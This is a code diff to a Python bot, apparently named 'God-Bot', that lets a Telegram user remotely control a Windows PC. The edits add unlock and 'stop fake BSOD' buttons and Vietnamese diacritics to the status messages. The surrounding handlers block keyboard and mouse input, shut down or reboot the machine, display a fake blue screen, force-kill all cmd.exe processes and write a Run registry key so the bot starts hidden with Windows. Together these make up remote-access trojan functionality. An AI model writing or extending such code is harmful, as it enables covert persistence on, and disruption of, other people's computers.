@@ -243,7 +243,9 @@ def handle_callback(callback_query):
         block_active = True
         import ctypes
         threading.Thread(target=lambda: [ctypes.windll.user32.BlockInput(True) for _ in iter(lambda: not block_active, True)], daemon=True).start()
-        send_telegram_message(chat_id, "🔒 Da khoa cung chuot va ban phim!")
+        # Gửi tin nhắn kèm nút Tắt Khóa ngay lập tức
+        markup = {"inline_keyboard": [[{"text": "🔓 Mở khóa ngay lập tức", "callback_data": "unlock_pc"}]]}
+        send_telegram_message(chat_id, "🔒 *Đã khóa cứng chuột và bàn phím máy tính!*", reply_markup=markup)
         
     elif data == "unlock_pc":
         block_active = False
@@ -252,24 +254,30 @@ def handle_callback(callback_query):
             ctypes.windll.user32.BlockInput(False)
         except:
             pass
-        send_telegram_message(chat_id, "🔓 Da mo khoa he thong!")
+        send_telegram_message(chat_id, "🔓 *Đã mở khóa hệ thống thành công!*")
         
     elif data == "shutdown_pc":
         subprocess.run("shutdown /s /t 0", shell=True)
-        send_telegram_message(chat_id, "⚡ Da tat may!")
+        send_telegram_message(chat_id, "⚡ Đã tắt máy!")
         
     elif data == "reboot_pc":
         subprocess.run("shutdown /r /t 0", shell=True)
-        send_telegram_message(chat_id, "🔄 Dang khoi dong lai may...")
+        send_telegram_message(chat_id, "🔄 Đang khởi động lại máy...")
         
     elif data == "fake_bsod":
-        send_telegram_message(chat_id, "🖥️ Da kich hoat man hinh xanh gia lap!")
         subprocess.run("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
+        # Gửi tin nhắn kèm nút tắt BSOD ngay lập tức
+        markup = {"inline_keyboard": [[{"text": "❌ Tắt Fake BSOD (Đóng CMD)", "callback_data": "stop_bsod"}]]}
+        send_telegram_message(chat_id, "🖥️ *Đã kích hoạt màn hình xanh giả lập!*", reply_markup=markup)
+        
+    elif data == "stop_bsod":
+        subprocess.run("taskkill /f /im cmd.exe", shell=True)
+        send_telegram_message(chat_id, "✅ *Đã tắt và dọn dẹp màn hình xanh giả lập!*")
         
     elif data == "beep_sound":
         import winsound
         winsound.Beep(2500, 2000)
-        send_telegram_message(chat_id, "🔊 Da phat am thanh canh bao tren loa may!")
+        send_telegram_message(chat_id, "🔊 Đã phát âm thanh cảnh báo trên loa máy!")
         
     elif data == "set_startup":
         try:
@@ -277,7 +285,7 @@ def handle_callback(callback_query):
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "TelegramRemoteBot", 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
             winreg.CloseKey(key)
-            send_telegram_message(chat_id, "🚀 Da cai dat tu dong khoi dong cung Windows!")
+            send_telegram_message(chat_id, "🚀 Đã cài đặt tự động khởi động cùng Windows!")
         except Exception as e:
             send_telegram_message(chat_id, f"Loi: {e}")
             
@@ -285,11 +293,11 @@ def handle_callback(callback_query):
         threading.Thread(target=self_update, args=(chat_id,)).start()
         
     elif data == "end_bot":
-        send_telegram_message(chat_id, "🛑 Dang tat hoan toan Bot...")
+        send_telegram_message(chat_id, "🛑 Đang tắt hoàn toàn Bot...")
         os._exit(0)
 
 def main_loop():
-    print("[*] God-Bot bot.py public dang chay ngam...")
+    print("[*] God-Bot bot.py public với nút tắt nhanh đang chạy ngầm...")
     offset = None
     while True:
         updates = get_updates(offset)
